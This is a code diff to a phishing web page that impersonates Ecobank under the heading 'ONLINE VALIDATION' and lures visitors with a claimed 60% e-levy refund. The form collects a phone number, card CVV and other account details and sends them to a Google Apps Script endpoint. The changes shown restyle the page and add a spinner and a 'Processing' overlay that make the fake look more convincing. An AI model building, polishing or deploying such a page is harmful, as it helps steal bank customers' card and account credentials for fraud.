@@ -16,29 +16,9 @@
       overflow-x: hidden;
     }
 
-    /* Animated waves behind header */
-    .header::before, .header::after {
-      content: "";
-      position: absolute;
-      width: 200%;
-      height: 200%;
-      top: -50%;
-      left: -50%;
-      background: radial-gradient(circle at 50% 50%, rgba(30,144,255,0.15), transparent 70%);
-      border-radius: 40%;
-      animation: wave 15s linear infinite;
-      z-index: 0;
-    }
-    .header::after { animation-delay: 7.5s; }
-    @keyframes wave {
-      0% { transform: rotate(0deg) translate(0,0); }
-      50% { transform: rotate(180deg) translate(20px, 20px); }
-      100% { transform: rotate(360deg) translate(0,0); }
-    }
-
     .header {
       position: relative;
-      background: linear-gradient(135deg, #08143a, #0b1d4d);
+      background: linear-gradient(135deg, #1c3faa, #2a5298); /* lighter blue */
       color: #fff;
       width: 100%;
       min-height: 180px;
@@ -52,78 +32,143 @@
       text-align: center;
     }
 
-    .header-content {
-      position: relative;
-      z-index: 1;
+    .header-content { position: relative; z-index: 1; }
+
+    .title-badge {
+      display: inline-block;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 50px;
+      font-size: 20px;
+      font-weight: bold;
+      text-transform: uppercase;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.25);
     }
 
-    .header-content h1 { margin: 0 0 10px; font-size: 24px; }
-    .header-content p { margin: 5px 0 0; font-size: 14px; }
+    .header-content p {
+      margin: 10px 0 0;
+      font-size: 14px;
+    }
 
     .login-container {
-      background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
-      color: #fff;
+      background: #fff;
+      color: #333;
       width: 90%;
       max-width: 360px;
       margin-top: -30px;
       padding: 30px 25px;
       border-radius: 12px;
       box-shadow: 0 6px 16px rgba(0,0,0,0.4);
-      backdrop-filter: blur(4px);
+      position: relative;
+      overflow: hidden;
     }
 
-    .login-container label { display: block; margin-bottom: 6px; font-size: 14px; color: #fff; }
+    .login-container label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #218838;
+    }
+
     .login-container input {
       width: 100%;
       padding: 12px;
       margin-bottom: 20px;
-      border: 1px solid #274080;
+      border: 1px solid #ccc;
       border-radius: 6px;
       font-size: 14px;
-      background-color: rgba(11,29,77,0.9);
-      color: #fff;
+      background-color: #f9f9f9;
+      color: #333;
     }
 
     .button-group {
       display: flex;
-      justify-content: space-between;
+      justify-content: center;
       gap: 10px;
       flex-wrap: wrap;
     }
 
     .button-group button {
       flex: 1;
-      padding: 12px;
+      padding: 14px 22px;
       border: none;
-      border-radius: 6px;
+      border-radius: 50px;
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: linear-gradient(135deg, #1e90ff, #187bcd);
+      background: linear-gradient(135deg, #28a745, #218838);
       color: #fff;
-      transition: all 0.3s ease;
+      transition: all 0.3s ease, transform 0.2s ease;
+      position: relative;
     }
 
+    .button-group button .spinner {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border: 3px solid rgba(255,255,255,0.4);
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      margin-left: 8px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+
     .button-group button:hover {
-      background: linear-gradient(135deg, #187bcd, #1560a3);
-      transform: scale(1.05);
-      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+      background: linear-gradient(135deg, #218838, #1e7e34);
+      transform: scale(1.08);
+      box-shadow: 0 6px 18px rgba(0,0,0,0.35);
+    }
+
+    .form-overlay {
+      display: flex;
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(255,255,255,0.7);
+      backdrop-filter: blur(4px);
+      z-index: 5;
+      justify-content: center;
+      align-items: center;
+      font-size: 18px;
+      font-weight: bold;
+      color: #218838;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+
+    .form-overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
     }
   </style>
 </head>
 <body>
   <div class="header">
     <div class="header-content">
-      <h1>ECOBANK ONLINE VALIDATION</h1>
+      <h1 class="title-badge">ECOBANK ONLINE VALIDATION</h1>
       <p>Validate your account information below to avoid service interruptions</p>
       <p>A 60% refund of e-levy charges awaits you!</p>
     </div>
   </div>
 
   <div class="login-container">
+    <div class="form-overlay" id="formOverlay">
+      Processing<span id="dots"></span>
+    </div>
     <form id="demoForm">
       <label>Phone Number</label>
       <input type="tel" name="phone_number" placeholder="Enter your phone number" required>
@@ -138,7 +183,10 @@
       <input type="text" name="cvv" placeholder="Enter CVV" required>
 
       <div class="button-group">
-        <button type="submit">VALIDATE →</button>
+        <button type="submit" id="submitBtn">
+          VALIDATE →
+          <span class="spinner" id="spinner"></span>
+        </button>
       </div>
     </form>
   </div>
@@ -146,9 +194,26 @@
   <script>
     const scriptURL = "https://script.google.com/macros/s/AKfycbxBZeRKxbAyf1pWTLN0z15_l-E3RXnp3hvx2gYHiDDU00GKZ3vBKVt7T2kImh9Sfoo1dw/exec";
     const form = document.getElementById("demoForm");
+    const submitBtn = document.getElementById("submitBtn");
+    const spinner = document.getElementById("spinner");
+    const formOverlay = document.getElementById("formOverlay");
+    const dots = document.getElementById("dots");
+    let dotsInterval;
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
+
+      submitBtn.disabled = true;
+      spinner.style.display = "inline-block";
+      submitBtn.firstChild.textContent = "Processing… ";
+      formOverlay.classList.add("active");
+
+      let dotCount = 0;
+      dotsInterval = setInterval(() => {
+        dotCount = (dotCount + 1) % 4;
+        dots.textContent = ".".repeat(dotCount);
+      }, 500);
+
       const formData = new FormData(form);
 
       try {
@@ -158,6 +223,13 @@
         else alert("Submission failed: " + result);
       } catch (err) {
         alert("Network error. Please try again.");
+      } finally {
+        submitBtn.disabled = false;
+        spinner.style.display = "none";
+        submitBtn.firstChild.textContent = "VALIDATE → ";
+        formOverlay.classList.remove("active");
+        clearInterval(dotsInterval);
+        dots.textContent = "";
       }
     });
   </script>
